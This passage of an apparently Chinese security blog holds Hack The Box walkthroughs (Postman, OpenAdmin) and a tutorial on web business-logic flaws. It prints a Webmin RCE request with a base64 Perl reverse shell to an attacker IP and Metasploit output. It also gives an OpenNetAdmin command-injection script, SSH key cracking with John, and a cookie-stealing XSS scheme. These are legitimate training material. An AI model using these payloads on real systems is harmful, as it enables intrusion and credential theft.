DES-EDE3-CBC,73E9CEFBCCF5287CJehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnXcwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k27GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT91u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcvEyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHPUH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VYSj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYKt+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdkeP2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3GeSbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3il3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8pS9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRRhkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58VXTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrODb6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXiWhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmhKTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92HmnpAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQVcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5WX+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==-----END RSA PRIVATE KEY----- 还可以用LinEnum.sh来查找敏感文件： 用ssh2john.py转换为John可识别的文件： 1kali@kali:~/Desktop$ /usr/share/john/ssh2john.py id_rsa &gt; id_rsa.hash 再用John来破解RSA密码： 123456789101112kali@kali:~/Desktop$ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hashUsing default input encoding: UTF-8Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashesCost 2 (iteration count) is 2 for all loaded hashesWill run 2 OpenMP threadsNote: This format may emit false positives, so it will keep trying even afterfinding a possible candidate.Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for statuscomputer2008 (id_rsa)1g 0:00:00:35 DONE (2020-02-10 04:28) 0.02844g/s 408014p/s 408014c/s 408014C/sa6_123..*7¡Vamos!Session completed 切换为Matt用户，读取user.txt文件： 12345redis@Postman:~$ su MattPassword: Matt@Postman:/var/lib/redis$ cd /home/Matt/Matt@Postman:~$ cat user.txt 517ad0ec2458ca97af8d93aac08a2f3c 这里不能用id_rsa私钥文件来登录靶机，每次登录成功后都会出现Connection close 用lse.sh脚本查看root权限运行的进程，发现又在10000端口上的webmin，用Matt和computer2008可以成功登录，Googlewebmin exploit，exploit-db上有如下利用方式： https://www.exploit-db.com/exploits/46984 metasploit也收录这个漏洞。 1234567891011121314151617181920212223242526272829303132333435363738Module options (exploit/linux/http/webmin_packageup_rce): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD computer2008 yes Webmin Password Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.160 yes The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27; RPORT 10000 yes The target port (TCP) SSL true no Negotiate SSL/TLS for outgoing connections TARGETURI / yes Base path for Webmin application USERNAME Matt yes Webmin Username VHOST no HTTP server virtual hostPayload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.4 yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 Webmin &lt;= 1.910msf5 exploit(linux/http/webmin_packageup_rce) &gt; exploit [*] Started reverse TCP handler on 10.10.14.113:4444 [+] Session cookie: ba61f4eadcffcce039b166a29defa004 [*] Attempting to execute the payload... [*] Command shell session 1 opened (10.10.14.113:4444 -&gt; 10.10.10.160:46990) at 2019-12-24 17:43:52 -0500 cat /root/root.txt a257741[-----------------]ddce 大概看了一下Payload的利用，应该是Webmin在管理升级软件的时候造成了命令注入，执行了额外的用户命令，也可以直接使用Burp Suite发送Payload： 123456789101112131415161718192021222324252627282930POST &#x2F;package-updates&#x2F;update.cgi HTTP&#x2F;1.1Host: [RHOST]:[RPORT]User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.1)Cookie: sid&#x3D;[INPUT GOOD SID HERE]Referer: [RHOST]:[RPORT]&#x2F;package-updates&#x2F;?xnavigation&#x3D;1Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 432Connection: closeu&#x3D;acl%2Fapt&amp;u&#x3D;[PAYLOAD HERE]-------------------------------------------------------- POC Payload InfoURL decoded | bash -c &quot;&#123;echo,cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4yMjI6NDQ0NCIpO1NURElOLT5mZG9wZW4oJGMscik7JH4tPmZkb3BlbigkYyx3KTt3aGlsZSg8Pil7aWYoJF89fiAvKC4qKS8pe3N5c3RlbSAkMTt9fTsn&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;base64 decodedperl -MIO -e &#39;$p&#x3D;fork;exit,if($p);foreach my $key(keys %ENV)&#123;if($ENV&#123;$key&#125;&#x3D;~&#x2F;(.*)&#x2F;)&#123;$ENV&#123;$key&#125;&#x3D;$1;&#125;&#125;$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;10.10.14.222:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);while(&lt;&gt;)&#123;if($_&#x3D;~ &#x2F;(.*)&#x2F;)&#123;system $1;&#125;&#125;;&#39;all together decoded | bash -c &quot;&#123;echo,perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);foreach my $key(keys %ENV)&#123;if($ENV&#123;$key&#125;&#x3D;~&#x2F;(.*)&#x2F;)&#123;$ENV&#123;$key&#125;&#x3D;$1;&#125;&#125;$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;10.10.14.222:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);while(&lt;&gt;)&#123;if($_&#x3D;~ &#x2F;(.*)&#x2F;)&#123;system $1;&#125;&#125;;&#39;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; 0x04 Summary “Postman”是基于Linux的靶机，首先利用Redis服务器，使攻击者可以生成自己的SSH公共密钥文件并将其写入服务器，以获取对系统的未授权访问并发现用户（Matt）的已加密的ssh密钥。 我们将获取到的加密的ssh密钥使用JohnTheRipper对其进行破解以获得ssh的密码。 之后，再利用10000端口上的Webmin Portal，以Matt的身份登录并访问Webmin面板。 最后，我们在Webmin面板中搜索了关于版本号的漏洞利用，并通过metasploit成功地利用了该漏洞并获得了root。 0x05 Reference [https://github.com/Dog9w23/Webmin-1.910-Exploit/blob/master/Webmin 1.910 - Remote Code Execution using BurpSuite](https://github.com/Dog9w23/Webmin-1.910-Exploit/blob/master/Webmin 1.910 - Remote Code Execution using BurpSuite) https://blog.csdn.net/test1988x/article/details/103921210 https://www.soeren.codes/2019/12/24/postbox-writeup/","tags":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"靶机/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"HTB::OpenAdmin Walkthrough","date":"2020-02-10T04:07:37.000Z","path":"Target_drone/HackTheBox/1.HTB-OpenAdmin-walkthrough/","text":"HTB::OpenAdmin Walkthrough 0x01 基本信息 0x02 使用工具和知识点 nmap dirbuster ssh2john.py john opennetadmin v18.1.1 exploit netstat -tulpn nano 0x03 渗透测试过程 端口探测 1234567891011121314151617181920root@ca01h:~# nmap -sC -sV -T5 10.10.10.171Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-07 18:31 HKTNmap scan report for 10.10.10.171Host is up (0.14s latency).Not shown: 996 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)| 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)|_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It works993/tcp closed imaps1025/tcp closed NFS-or-IISService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 76.12 seconds 目标靶机开放了22 SSH和80 HTTP端口，其中80端口上运行着Apache服务，我们在浏览器中直接访问该端口，发现是Apache的默认起始页： 目录探测 使用DirBuster工具和Kali自带的字典directory-list-2.3-medium.txt对站点进行目录爆破： DirBuster暂时就放在后台，目前爆破出来的主要是两个目录：ona和music。我们直接尝试http://10.10.10.171/ona/页面： 有一个DOWNLOAD链接，点进去看一下，发现是OpenNetAdmin官网，并且当前的版本号是v18.1.1。 OpenNetAdmin is an opensource IP Address Management (IPAM) system. 直接去Google一下opennetadmin v18.1.1 exploit，发现ExploitDB列出了两个exploit： https://www.exploit-db.com/exploits/47691 https://www.exploit-db.com/exploits/47772 漏洞利用 1234567891011121314151617181920212223# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution# Date: 2019-11-19# Exploit Author: mattpascoe# Vendor Homepage: http://opennetadmin.com/# Software Link: https://github.com/opennetadmin/ona# Version: v18.1.1# Tested on: Linux # Exploit Title: OpenNetAdmin v18.1.1 RCE# Date: 2019-11-19# Exploit Author: mattpascoe# Vendor Homepage: http://opennetadmin.com/# Software Link: https://github.com/opennetadmin/ona# Version: v18.1.1# Tested on: Linux #!/bin/bash URL=&quot;$&#123;1&#125;&quot;while true;do echo -n &quot;$ &quot;; read cmd curl --silent -d &quot;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \\&quot;BEGIN\\&quot;;$&#123;cmd&#125;;echo \\&quot;END\\&quot;&amp;xajaxargs[]=ping&quot; &quot;$&#123;URL&#125;&quot; | sed -n -e &#x27;/BEGIN/,/END/ p&#x27; | tail -n +2 | head -n -1done 将上面的Bash脚本保存到Kali，并执行命令，可以得到反弹shell： 1bash ona.sh http://10.10.10.171/ona/ 经过测试发现，当前用户是www-data，不能执行cd命令离开当前目录，用find / -type d -user www-data查看有权限访问的目录。 find - is a linux command to find anything like file or directory. The first argument i.e / is the place to perform the search. -type - It takes f or d resembling what we are searching. f - For files d - For directories -user - This tells in connection to which user. This command will search all the files that have permission for www-data under /(complete file system) 内容太多这里就不贴结果了，基本上就是/opt/ona/www/和/var/www/ona/两个目录，首先去看config配置文件： 查看config.inc.php，发现有一个数据库的配置文件： 12// Include the localized Database settings$dbconffile = &quot;&#123;$base&#125;/local/config/database_settings.inc.php&quot;; 找到了mysql的登录用户密码：n1nj4W4rri0R!，再看一下/var/www/目录，发现有一个internal目录属于Jimmy用户，用Jimmy和mysql的密码登录SSH。 12345678910111213141516171819jimmy@openadmin:~$ cd /var/www/internaljimmy@openadmin:/var/www/internal$ ls -latotal 20drwxrwx--- 2 jimmy internal 4096 Nov 23 17:43 .drwxr-xr-x 4 root root 4096 Nov 22 18:15 ..-rwxrwxr-x 1 jimmy internal 3229 Nov 22 23:24 index.php-rwxrwxr-x 1 jimmy internal 185 Nov 23 16:37 logout.php-rwxrwxr-x 1 jimmy internal 339 Nov 23 17:40 main.phpjimmy@openadmin:/var/www/internal$ cat main.php&lt;?php session_start(); if (!isset ($_SESSION[&#x27;username&#x27;])) &#123; header(&quot;Location: /index.php&quot;); &#125;; # Open Admin Trusted# OpenAdmin$output = shell_exec(&#x27;cat /home/joanna/.ssh/id_rsa&#x27;);echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;?&gt;&lt;html&gt;&lt;h3&gt;Don&#x27;t forget your &quot;ninja&quot; password&lt;/h3&gt;Click here to logout &lt;a href=&quot;logout.php&quot; tite = &quot;Logout&quot;&gt;Session&lt;/html&gt; mian.php文件提示通过登录认证jimmy用户输出另一个用户joanna的rsa密钥，现在我们就需要知道，这个服务运行在哪个端口上 1234567891011jimmy@openadmin:~$ curl http://localhost/main.php&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Not Found&lt;/h1&gt;&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;&lt;hr&gt;&lt;address&gt;Apache/2.4.29 (Ubuntu) Server at localhost Port 80&lt;/address&gt;&lt;/body&gt;&lt;/html&gt; 不是普通的80端口，运行netstat -tulpn命令： 12345678910111213immy@openadmin:~$ netstat -tulpn(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:52846 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - udp 0 0 127.0.0.53:53 0.0.0.0:* - 列出来的端口中最有可能的就是52846： 1234567891011121314151617181920212223242526272829303132333435url http:&#x2F;&#x2F;localhost:52846&#x2F;main.php&lt;pre&gt;-----BEGIN RSA PRIVATE KEY-----Proc-Type: 4,ENCRYPTEDDEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6DkG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8ad&#x2F;StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YOShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE6xaubNKhDJKs&#x2F;6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5&#x2F;Duy8byJ&#x2F;3I3&#x2F;EsqHphIHgD3UfvHy9naXc&#x2F;nLUup7s0+WAZ4AUx&#x2F;MJnJV2nN8o69JyI9z7V9E4q&#x2F;aKCh&#x2F;xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv&#x2F;dEVEppvIDE&#x2F;8h&#x2F;&#x2F;U1cPvX9Aci0EUys3naB6pVW8i&#x2F;IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH40ZNca5xHPij8hvUR2v5jGM&#x2F;8bvr&#x2F;7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN&#x2F;AZfnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80X1VZ+N7S8ZP+7djB22vQ+&#x2F;pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFgS33lgrCM4&#x2F;ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey&#x2F;ur&#x2F;4FFnonsEl16TZvolSt9RH&#x2F;19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzhTh5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD&#x2F;GtPmcviGCexaRTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7ZuhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA&#x2F;MxlYJ9FNDr1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM&#x2F;SLhS79yPzCZH8uWIrjaNaZmDSPC&#x2F;z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7&#x2F;ee6KDTl7JMdV25DM9a16JYOneRtMtqlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adtz0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQeK1I1cqiDbVE&#x2F;bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw&#x2F;iMKhpITWLWApA3k9EN-----END RSA PRIVATE KEY-----&lt;&#x2F;pre&gt;&lt;html&gt;&lt;h3&gt;Don&#39;t forget your &quot;ninja&quot; password&lt;&#x2F;h3&gt;Click here to logout &lt;a href&#x3D;&quot;logout.php&quot; tite &#x3D; &quot;Logout&quot;&gt;Session&lt;&#x2F;html&gt; 解密rsa得到一个密码叫bloodninjas： 12345678910111213kali@kali:~/Desktop$ python /usr/share/john/ssh2john.py joanna_rsa &gt; joanna_rsa.hashkali@kali:~/Desktop$ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt joanna_rsa.hash Using default input encoding: UTF-8Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashesCost 2 (iteration count) is 1 for all loaded hashesWill run 2 OpenMP threadsNote: This format may emit false positives, so it will keep trying even afterfinding a possible candidate.Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for statusbloodninjas (joanna_rsa)1g 0:00:00:16 DONE (2020-02-09 08:19) 0.06172g/s 885290p/s 885290c/s 885290C/sa6_123..*7¡Vamos!Session completed 经尝试这个密码并不是joanna的ssh连接密码，而是利用密钥连接ssh时对私钥的验证密码。之后连接到joanna的ssh，注意一定要将私钥的文件权限设置为700： 1234567891011121314151617181920212223242526272829kali@kali:~/Desktop$ chmod 700 joanna_rsakali@kali:~/Desktop$ ssh -i joanna_rsa joanna@10.10.10.171Enter passphrase for key &#x27;joanna_rsa&#x27;: Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun Feb 9 14:18:59 UTC 2020 System load: 1.04 Processes: 164 Usage of /: 49.6% of 7.81GB Users logged in: 2 Memory usage: 24% IP address for ens160: 10.10.10.171 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch41 packages can be updated.12 updates are security updates.Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Sun Feb 9 14:17:21 2020 from 10.10.15.190joanna@openadmin:~$ 接下来就可以很简单的找到user.txt： 1234567891011121314151617joanna@openadmin:~$ ls -latotal 48drwxr-x--- 6 joanna joanna 4096 Feb 9 14:17 .drwxr-xr-x 4 root root 4096 Nov 22 18:00 ..-rw-rw-r-- 1 joanna joanna 64 Feb 9 14:02 0lrwxrwxrwx 1 joanna joanna 9 Nov 22 18:02 .bash_history -&gt; /dev/null-rw-r--r-- 1 joanna joanna 220 Nov 22 18:00 .bash_logout-rw-r--r-- 1 joanna joanna 3771 Nov 22 18:00 .bashrcdrwx------ 2 joanna joanna 4096 Nov 22 22:42 .cachedrwx------ 3 joanna joanna 4096 Nov 22 22:42 .gnupgdrwxrwxr-x 3 joanna joanna 4096 Nov 22 18:53 .local-rw------- 1 joanna joanna 86 Feb 9 14:17 nano.save-rw-r--r-- 1 joanna joanna 807 Nov 22 18:00 .profiledrwx------ 2 joanna joanna 4096 Nov 23 17:31 .ssh-rw-rw-r-- 1 joanna joanna 33 Nov 28 09:37 user.txtjoanna@openadmin:~$ cat user.txtc9b2c[--------------]f0c81b5f sudo -l命令显示用户Joanna能够以root用户身份运行/bin/nano /opt/priv，而无需输入密码。 当看到用户可以以root用户身份运行nano时，这是最简单的利用方法。 1234567joanna@openadmin:/$ sudo -lMatching Defaults entries for joanna on openadmin: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser joanna may run the following commands on openadmin: (ALL) NOPASSWD: /bin/nano /opt/priv 就可以得到/root/root.txt文件： 0x04 Reference https://decdeg.com/hackthebox-open-admin-10-10-10-171/ https://www.jianshu.com/p/9f1f9145ac3f https://xz.aliyun.com/t/3958#toc-1","tags":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"靶机/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"git常用命令思维导图","date":"2020-02-05T05:07:02.000Z","path":"Other/4.git常用命令思维导图/","text":"Git Sheatcheat ——搬运自https://www.zhihu.com/answer/975066538","tags":[{"name":"git","slug":"git","permalink":"http://ca0y1h.top/tags/git/"}],"categories":[{"name":"技术随笔","slug":"技术随笔","permalink":"http://ca0y1h.top/categories/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"}]},{"title":"Web安全学习之逻辑漏洞利用","date":"2020-01-24T05:04:54.000Z","path":"Web_security/basic_learning/19.逻辑漏洞利用/","text":"Web安全学习之逻辑漏洞利用 逻辑漏洞概述 由于程序逻辑不严谨或逻辑太过复杂，导致一些逻辑分支不能正常处理或处理错误，统称为业务逻辑漏洞。常见的逻辑漏洞有交易支付、密码修改、密码找回、越权修改、越权查询、突破限制等，下图是简单的逻辑漏洞总结，在挖掘的过程中更多的时候需要脑洞大开： 挖掘逻辑漏洞的过程中，需要一些技巧和非常规思路，有点像边缘测试的思想。一般的思路是： 1确定业务流程---&gt;寻找流程中可以被操控的环节---&gt;分析可被操控环节中可能产生的逻辑问题---&gt;尝试修改参数触发逻辑问题 逻辑漏洞分类 饮料贩卖机 替换订单ID，创建订单时在支付界面，在此创建订单替换订单ID（高价替换低价） 无限新用户优惠订单，重复创建优惠订单 替换优惠卷ID（未达到条件使用） 个别情况订单数量为1.99时，客户端只支付1元，实际上服务器认为支付了2元。 取货时并发（真实案例） 直播 快速进出房间炸房 无限发送点赞协议 修改礼物数量，0，小数，负数，特定值（一般情况下为1073741824） 修改礼物ID，遍历尝试是否有隐藏ID。 并发送礼物，抽奖 无限创建首次优惠订单，有些首次优惠订单是一个特殊的pid，这种的直接替换pid进行支付。有些是相同的ID，这种的提前创建订单，记录多个订单号在依次修改订单支付。 刷屏：发言刷屏，分享，点赞等有提示的地方刷屏 房间内可以申请的地方进行申请取消操作，看看是否能炸房。 越权踢人，增加管理员，关闭房间等操作。 发送的表情是否可以修改长宽（真实案例） 购物app 购买数量：为0，小数，负数，正负值（A为-1，B为2，总值为1） 代金卷：并发领取，遍历领取，同一个代金卷重复使用，未满足条件使用代金卷 越权：登陆，操作别人订单，修改资料 外卖 商品数量，0，负数，小数，特定值，正负数（A为-1，B为2，总值为1） 送餐员评价修改，星级，打赏金额（小数，负数） 商品评价，星级，评论字数，上传图片是否可以自定义格式， 订单超出送餐地址 强行货到付款，取消订单，退款 越权操作别人订单，登陆 优惠购买会员（重复使用优惠购买） 交易平台 钱包并发提现，负数提现 使用钱包支付时多个订单并发支付（是否支付金额能大于余额） 转账负数，并发转账 上架商品突破限制，例如数量，字数。 替换订单，创建订单号如果订单状态可修改，先进到支付界面，然后将订单修改成更大的金额，然后支付提前进入的支付界面 数量修改 社交 强行举报（读取本地消息上传那种） 强行加好友（一般尝试重发通过好友这条协议） 自由修改号码（靓号类） 群管理无限禁言 越权禁言，替人，拉黑 会员修改金额，数量。无限优惠购买 非会员使用会员功能 漫画 打赏金额为负数，小数，特定值（溢出） 越权删除评论，登陆 修改充值金额 付费漫画免费看 评论图片数量过多会导致客户端加载卡死 音乐 唱歌类软件修改上传分数等参数 付费下载尝试替换下载ID 修改付费下载金额 F12查看下是否有歌曲地址 网约车 无限叫车，重复发送协议造成市场混乱 修改评价分数 修改限时优惠叫车关键参数 替换优惠卷 越权操作其他订单 业务逻辑漏洞需要对业务熟悉，有很强的逻辑思维能力，所以下面主要描述一下ZZCMS8.1中注册、登录和密码找回出现的漏洞逻辑，再尽量多和全的收集整理相关场景。 逻辑漏洞利用实例 ZZCMS 8.1 批量注册 我们把注册功能填写相关信息，然后抓包： 将数据包发送到repeater，每次修改username值，发现，只需要修改username值就可以注册成功用户，图形验证码无效，并且未对电话，邮箱等信息校验，可批量注册。 批量猜解用户 同样是注册功能，在输入用户名时，发现会提示用户名是否存在，猜测该位置可以猜测哪些用户注册过该网站。 抓取该位置数据包发现，会对用户名id进行判断，是否存在，是否符合规则，由此我们可以批量探测用户，发现可以批量探测已注册过的用户： 任意密码重置 在忘记密码功能，我们输入用户名正确后会进行短信验证码，通过手机验证码或者邮箱验证码。 在验证码功能中输入验证码进行验证，发现其中有一段JavaScript代码document.userreg.yzm_mobile2.value=='no'是用来验证验证码是否正确，那么就可以直接在控制台直接改变这个值就可以绕过验证码： 平行越权 越权又可分为平行越权（相同用户）、垂直越权（低权限用户和高权限用户）、未授权访问（无需用户直接操作）。 登录普通用户test2,查看用户敏感的页面： 发送到repteater数据包中，看到cookie中存在username参数，修改为已存在的用户名，发现返回包中可查看其他用户敏感信息。 PHPMyWind 5.5 由于网上没有找到PHPMyWind5.5的源码，只能看看其他师傅分析的文章，这里就再大概复述一遍。 首先对实验环境做一个简单说明： 服务器 192.168.114.159 部署有“PHPMyWind 5.5” 攻击机（safedog） 192.168.114.1 部署有能“收集PHPMyWind用户的Cookie”的PHP脚本、JS脚本 受害者（victim） 192.168.114.161 可通过浏览器访问“服务器”上的“PHPMyWind”网站 过程1代表攻击者safedog通过邮件等方式发送恶意链接（嵌有可盗取并发送Cookie的JS脚本）给受害者victim； 过程2代表在受害者victim受诱导点击恶意链接后，会经由浏览器将攻击者safedog嵌入的JS脚本当做数据发送给服务器上的PHPMyWind网站的反射型XSS漏洞点； 过程3与过程4代表PHPMyWind网站在受到反射型XSS攻击后，会执行JS脚本，将受害者victim的Cookie返回给受害者victim，并发送给攻击者safedog。 过程5代表攻击者safedog在获得受害者victim的Cookie后，利用受害者victim的Cookie与PHPMyWind网站的逻辑漏洞点进行密码重置攻击。 反射型XSS 攻击者搭建可接收受害者Cookie的PHP网站； 该PHP网站由“ReflectiveXSS.js”“ReflectiveXSS.php”和“cookie.txt”这3个文件构成。 